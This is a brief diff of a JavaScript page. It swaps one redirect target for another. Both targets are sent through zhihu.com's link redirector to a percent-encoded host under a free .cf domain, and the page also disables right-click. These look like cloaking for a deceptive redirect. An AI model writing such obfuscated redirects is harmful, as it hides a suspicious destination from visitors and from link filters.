@@ -17,7 +17,7 @@ setInterval(function () {
 
 
 document.oncontextmenu = function () { return false; };    
- var x='https://link.zhihu.com/?target=https://%78%6e%2d%2d%38%39%71%35%32%36%65%67%78%6a%79%61%34%32%35%6e%71%6a%61%6d%39%30%64%2e%64%61%6c%6f%6e%67%2e%63%66/';
+ var x='https://link.zhihu.com/?target=https://请点击继续访问.%64%61%6c%6f%6e%67%2e%63%66/';
     $(function () {
         let u = window.document.location.href.toString().split("?");
         if (typeof (u[1]) == "string") {
